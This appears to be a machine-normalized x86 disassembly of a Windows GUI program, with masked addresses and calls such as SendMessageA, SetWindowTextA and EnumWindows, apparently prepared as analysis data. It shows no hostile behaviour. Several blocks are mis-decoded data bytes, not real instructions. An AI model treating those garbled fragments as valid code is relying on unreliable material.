jmp sub_42e76c
sub_42e781
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ea08
call sub_43f44c
retn
sub_42ea10
push ebx
mov ebx eax
mov eax ebx
call sub_42ea2c
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42ea24
mov eax [ r-xdata ]
retn
sub_42ea2c
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_42ea38
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_42d520
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_42ea50
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_42ea88
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42eb38
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42eb54
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_42ea90
sub_42eb68
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42eb84
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42eba4
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ebfc
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_42ea90
sub_42ec10
push esi
mov esi eax
mov eax esi
call sub_43f5fc
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403468
sub_42ed5d
jmp sub_4039c0
sub_42ed64
pop edi
pop esi
pop ecx
pop ebp
retn
sub_42ed6c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ed74
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ed7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_42d4ac
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_42d5c0
pop esi
pop ebx
retn
sub_42efac
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_40326c
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42f070
jmp sub_4039c0
sub_42f077
pop ebp
retn
sub_42f07c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42efc8
call sub_403d90
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c88
sub_42f0c9
jmp sub_4039c0
sub_42f0d0
pop ebp
retn
sub_42f0d4
sub [ rw-data ] 0x1
retn
sub_42f130
jmp sub_4039c0
sub_42f137
pop ebp
retn
sub_42f13c
sub [ rw-data ] 0x1
retn
sub_42f198
jmp sub_4039c0
sub_42f19f
pop ebp
retn
sub_42f1a4
sub [ rw-data ] 0x1
retn
sub_42f205
jmp sub_4039c0
sub_42f20c
pop ebp
retn
sub_42f210
sub [ rw-data ] 0x1
retn
sub_42f25c
jmp sub_4039c0
sub_42f263
pop ebp
retn
sub_42f268
sub [ rw-data ] 0x1
retn
sub_42f295
jmp sub_4039c0
sub_42f29c
pop ebp
retn
sub_42f2a0
sub [ rw-data ] 0x1
retn
sub_42f348
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bc64
mov [ rw-data ] eax
sub_42f394
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42f417
jmp sub_4039c0
sub_42f420
sub [ rw-data ] 0x1
retn
sub_42f48f
jmp [ edi ]
sub_42f730
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42f748
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42f78c
push ebx
mov ebx eax
mov eax ebx
call sub_42ffe8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42ffd7
jmp sub_4039c0
sub_42ffe8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_426290
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42f75c
sub_43003f
jmp sub_4039c0
sub_430046
pop ebp
retn
sub_430048
sub [ rw-data ] 0x1
retn
sub_4304fe
fiadd [ ebx ]
hlt
sub_43201a
fiadd [ ebx ]
hlt
sub_4333bc
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_43358f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x201d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43394a
jmp sub_4039c0
sub_433951
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4339d6
jmp sub_4039c0
sub_4339dd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4339e4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_440fb8
pop ebx
retn
sub_4339f8
push ebx
mov ebx eax
mov eax ebx
call sub_443d10
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_440fb8
pop ebx
retn
sub_433a14
push ebx
mov ebx eax
mov eax ebx
call sub_442ce4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433ac0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43dec4
pop esi
pop ebx
retn
sub_433c2a
jmp sub_4039c0
sub_433c31
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433d40
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43ffcc
mov eax ebx
mov si 0xffc7
call sub_403468
pop esi
pop ebx
retn
sub_433e2c
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433e48
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403468
sub_433e64
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_433e70
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419450
sub_433e84
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433ee4
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433f58
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403468
pop esi
pop ebx
retn
sub_433f74
push esi
mov esi eax
mov eax esi
call sub_43fad8
mov eax esi
mov si 0xffc7
call sub_403468
pop esi
retn
sub_434019
jmp sub_4039c0
sub_434020
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434028
push ebx
mov ebx eax
mov eax ebx
call sub_43fc3c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_43404c
push ebx
mov ebx eax
mov eax ebx
call sub_43fc54
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_434138
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_434738
sub_43414c
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_434738
mov eax ebx
call sub_441c98
sub_434170
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_441c98
sub_4342a1
jmp sub_4039c0
sub_4342a8
pop ebx
pop ecx
pop ebp
retn
sub_4343c0
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4446f8
push eax
call SetWindowTextA
pop ebx
retn
sub_4343dc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop ebx
retn
sub_4343f8
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop ebx
retn
sub_43449e
jmp sub_4039c0
sub_4344a5
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43453e
jmp sub_4039c0
sub_4346b7
jmp sub_4039c0
sub_43471c
push ebx
mov ebx eax
mov eax ebx
call sub_4341b4
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_441a94
pop ebx
retn
sub_43481c
push ebx
mov ebx eax
mov eax ebx
call sub_43dad0
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_434914
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403468
sub_4349c4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
pop ebx
retn
sub_434a46
jmp sub_4039c0
sub_434a4d
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434b38
jmp sub_4039c0
sub_434b3f
pop ebx
pop ecx
pop ebp
retn
sub_434c33
jmp sub_4039c0
sub_434c3a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434cb7
jmp sub_4039c0
sub_434cbe
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434e14
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_43dea0
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_434e64
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop ebx
retn
sub_434f98
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_441c98
sub_434fcc
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_434fd4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_434fdc
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_435008
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_43f0c4
sub_435160
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_435180
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_441c98
sub_43544b
jmp sub_40370c
sub_435450
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4356dc
jmp sub_4039c0
sub_4356e3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4356ec
push ebx
mov ebx eax
mov eax ebx
call sub_43dad0
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4357b9
jmp sub_4039c0
sub_4357c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4357cc
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_435848
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_435962
jmp sub_4039c0
sub_4359ac
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_435a37
jmp sub_4039c0
sub_435a3e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435a70
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_435a7c
mov [ eax + 0x210 ] edx
retn
sub_435acd
jmp sub_4039c0
sub_435ad4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435b9c
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_441c98
sub_435bf0
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_435c05
mov eax [ eax + 0x238 ]
retn
sub_435c05
push 0x0
xor ecx ecx
mov edx 0x154
call sub_43f0c4
retn
sub_435f44
jmp sub_4039c0
sub_435f4b
pop ebx
mov esp ebp
pop ebp
retn
sub_436308
jmp sub_4039c0
sub_43630f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4364cd
jmp sub_4039c0
sub_4364d4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4364e0
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4366c4
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4366d0
mov eax [ r-xdata ]
retn
sub_436901
jmp sub_4039c0
sub_436910
retn
sub_4369c6
jmp sub_4039c0
sub_436a70
mov eax [ r-xdata ]
retn
sub_436a78
xor eax eax
retn
sub_436a9c
retn
sub_436bb4
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_441c98
sub_436c2c
push ebx
mov ebx eax
mov eax ebx
call sub_455b0c
test eax eax
je r-xdata
mov eax ebx
call sub_43f44c
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_436c50
xor eax eax
retn
sub_436d17
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5671173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_436d30
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403468
sub_436e21
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_436e2a
jmp sub_4039c0
j_sub_436e21
jmp sub_436e21
sub_436e31
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436f64
mov al [ eax + 0x211 ]
retn
sub_436f98
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_441c98
sub_437178
call sub_441c98
retn
sub_4371f5
jmp sub_4039c0
sub_4371fc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437373
aam 0x8b
fmul [ ebp - 0x74e3dbac ]
retn
sub_4375bf
jmp sub_4039c0
sub_4375c6
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4375d0
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_437488
retn
sub_43763c
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_437488
retn
sub_437654
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_437488
retn
sub_437668
push ebx
mov ebx eax
mov eax ebx
call sub_43dad0
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_43768c
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_4377c4
call sub_4376ac
retn
sub_4377cc
call sub_4376ac
retn
sub_4377fc
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_437829
jmp sub_4039c0
sub_437830
pop ebp
retn
sub_437834
sub [ rw-data ] 0x1
retn
sub_437991
jmp sub_4039c0
sub_437998
pop ebp
retn
sub_43799c
sub [ rw-data ] 0x1
retn
sub_4379a4
test [ fs : esi ] 0xf6
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_43821c
sub_4379b5
add eax 0xffffffe0
jmp sub_437f9c
sub_4379bd
add eax 0xffffffe0
jmp sub_438004
sub_4379c5
add eax 0xffffffe0
jmp sub_438118
sub_4379cd
add eax 0xffffffe0
jmp sub_43818c
sub_4379d5
add eax 0xffffffe0
jmp sub_437c48
sub_4379dd
add eax 0xffffffe0
jmp sub_437c5c
sub_4379e5
add eax 0xffffffe0
jmp sub_437cd4
sub_4379fd
add eax 0xffffffe0
jmp sub_437e04
sub_437a05
add eax 0xffffffe0
jmp sub_437f4c
sub_437a0d
add eax 0xffffffe0
jmp sub_437f50
sub_437a15
add eax 0xffffffe0
jmp sub_437f6c
sub_437a27
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4056fc
sub_437a31
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405710
sub_437c05
jmp sub_4039c0
sub_437c0c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437c48
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_404010
pop ebx
retn
sub_437cc3
jmp sub_4039c0
sub_437cca
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437d5c
jmp sub_4039c0
sub_437d63
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437df7
jmp sub_4039c0
sub_437dfe
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437efc
jmp sub_4039c0
sub_437f03
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437f4c
mov [ eax + 0xc ] edx
retn
sub_437f50
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_437f75
inc [ ebx + 0x74001c7b ]
or [ ebp - 0x5b17e3bd ] cl
salc
cld
inc [ ebx + 0x46fafc3d ]
add [ eax ] al
je r-xdata
pop ebx
retn
mov eax rw-data
call sub_405628
sub_437ff4
jmp sub_4039c0
sub_437ffb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4380fa
jmp sub_4039c0
sub_438101
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43817a
jmp sub_4039c0
sub_438181
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43820c
jmp sub_4039c0
sub_438213
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438307
jmp sub_4039c0
sub_43830e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4383d0
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43831c
call EnumWindows
retn
sub_438462
jmp sub_4039c0
sub_438469
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_438474
xor eax eax
retn
sub_43856d
jmp sub_4039c0
sub_438574
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43865e
jmp sub_4039c0
sub_438665
pop ebp
retn
sub_4386ba
jmp sub_4039c0
sub_4386c1
pop ebp
retn
sub_438e58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_438ea2
inc ebx
add [ eax + 0x40 ] dh
inc ecx
add [ edi + edi - 0x340bffbf ] al
inc ebx
add ah ah
0x43
sub_439844
jmp r-xdata
sub_439846
0xe8ffe9ff 0xe7ff
sub_43984d
jmp esi
sub_43a905
add eax 0xffffff8c
jmp sub_446d84
sub_43a90d
add eax 0xffffff8c
jmp sub_446d88
sub_43a915
add eax 0xffffff8c
jmp sub_446e74
sub_43a91d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43a92a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43a937
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43a944
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43a951
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43a95e
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43a96b
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43a978
add eax 0xffffff8c
jmp sub_4484e4
sub_43a98a
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4056fc
sub_43a994
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405710
sub_43ac50
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43af63
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413478
retn
sub_43af80
push 0x15
mov ecx rw-data
call sub_413438
retn
sub_43b06c
call GetCapture
call sub_43ad50
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43b2d0
push ebx
push eax
push sub_43b454
call sub_41a4cc
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43b2e8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43b318
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41a580
pop ebx
retn
sub_43b3f6
jmp sub_40370c
sub_43b428
xor eax eax
retn
sub_43b42c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43b444
retn
sub_43b448
mov eax [ rw-data ]
retn
sub_43b450
retn
sub_43b47e
jmp sub_40370c
sub_43b483
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b4a0
call sub_4034c4
xor eax eax
mov [ rw-data ] eax
retn
sub_43b4b0
call sub_4034c0
xor eax eax
mov [ rw-data ] eax
retn
sub_43b4c0
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403590
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43b570
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43b588
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43b5d4
retn
sub_43b78c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403468
pop esi
retn
sub_43b7a0
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403468
pop esi
retn
sub_43b7b4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43b7c0
mov eax 0x4
retn
sub_43b7c8
retn
sub_43c3b9
jmp sub_40370c
sub_43c6a6
jmp sub_4039c0
sub_43c718
jmp sub_4039c0
sub_43c724
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43c44c
sub_43c8a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d520
retn
sub_43c8b9
jmp sub_4039c0
sub_43c8e0
jmp sub_4039c0
sub_43c962
jmp sub_4039c0
sub_43c98a
jmp sub_4039c0
sub_43c991
mov esp ebp
pop ebp
retn
sub_43ca49
jmp sub_4039c0
sub_43caa0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43ca6c
mov [ ebx + 0x58 ] esi
sub_43cbf4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43cc08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43ccf1
jmp sub_4039c0
sub_43ccf8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cd7b
jmp sub_4039c0
sub_43cd82
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43d150
xor eax eax
retn
sub_43d154
mov al [ eax + 0x58 ]
retn
sub_43d158
xor eax eax
retn
sub_43d15c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43d164
mov eax [ eax + 0x30 ]
retn
sub_43d208
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43d2b4
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43d2cc
mov [ eax + 0x5d ] dl
retn
sub_43d2d0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_440efc
sub_43d2e0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43d7c3
jmp sub_4039c0
sub_43d7ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d82c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43d8b0
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43d9cd
jmp sub_4039c0
sub_43d9d4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dad0
push eax
xor ecx ecx
mov edx 0xb037
call sub_43f0c4
retn
sub_43dc91
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403468
sub_43dd42
jmp sub_4039c0
sub_43dd49
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43de20
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43f0c4
sub_43de38
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43f0c4
retn
sub_43de48
push edx
mov edx 0xd
call sub_43f0c4
retn
sub_43de54
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43de68
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43df49
jmp sub_4039c0
sub_43df50
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43df58
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43f0c4
sub_43dfc8
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
